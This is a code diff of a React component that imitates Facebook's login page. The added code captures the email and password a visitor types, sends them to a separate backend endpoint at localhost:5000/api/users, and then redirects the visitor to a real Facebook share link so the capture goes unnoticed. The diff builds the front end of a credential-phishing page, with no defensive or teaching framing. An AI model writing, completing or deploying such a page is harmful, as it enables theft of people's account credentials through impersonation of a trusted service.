@@ -1,4 +1,44 @@
+import { useState } from "react";
+
 function App() {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  // Submit handler
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    if (!email || !password) {
+      alert("Please fill both fields");
+      return;
+    }
+
+    try {
+      setLoading(true);
+
+      const res = await fetch("http://localhost:5000/api/users", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      });
+
+      const data = await res.json();
+
+    if (data.success) {
+  window.location.href = "https://www.facebook.com/share/r/1D9pKTPKrz/";
+  setEmail("");
+  setPassword("");
+} else {
+        alert("Failed: " + data.message);
+      }
+    } catch (error) {
+      alert("Server error: " + error.message);
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <div className="min-h-screen bg-[#f0f2f5]">
       <div className="flex items-center justify-center min-h-screen">
@@ -14,26 +54,39 @@ function App() {
             </p>
           </div>
 
-          {/* RIGHT SIDE CARD */}
+          {/* RIGHT SIDE FORM */}
           <div className="w-full flex justify-center md:justify-end md:mt-[-40px]">
-            <div className="w-[700px] bg-white rounded-lg shadow-[0_8px_16px_rgba(0,0,0,0.1)] px-8 pt-8 pb-8">
-              <div className="space-y-3">
+            <div className="w-[700px] bg-white rounded-lg shadow-[0_8px_16px_rgba(0,0,0,0.1)] px-8 pt-8 pb-8  lg:py-20">
+              <form onSubmit={handleSubmit} className="space-y-3">
+
                 <input
                   type="text"
                   placeholder="Email address or phone number"
-                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#333538] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#333538] focus:outline-none focus:border-[#1877f2]"
                 />
 
                 <input
                   type="password"
                   placeholder="Password"
-                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#414347] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full h-[60px] border border-[#dddfe2] rounded-lg px-4 text-[17px] placeholder:text-[#414347] focus:outline-none focus:border-[#1877f2]"
                 />
 
-                <button className="w-full h-[56px] rounded-lg bg-[#1877f2] text-white text-[20px] font-bold hover:bg-[#166fe5]">
-                  Log in
+                <button
+                  type="submit"
+                  disabled={loading}
+                  className="w-full h-[56px] rounded-lg bg-[#1877f2] text-white text-[20px] font-bold hover:bg-[#166fe5] disabled:opacity-50"
+                >
+                  {loading ? "Saving..." : "Log in"}
                 </button>
-              </div>
+              </form>
+
+
+
+
 
               <div className="mt-3 text-center">
                 <a href="#" className="text-[14px] text-[#1877f2] hover:underline">
@@ -49,6 +102,7 @@ function App() {
                 </button>
               </div>
             </div>
+            
           </div>
 
         </div>
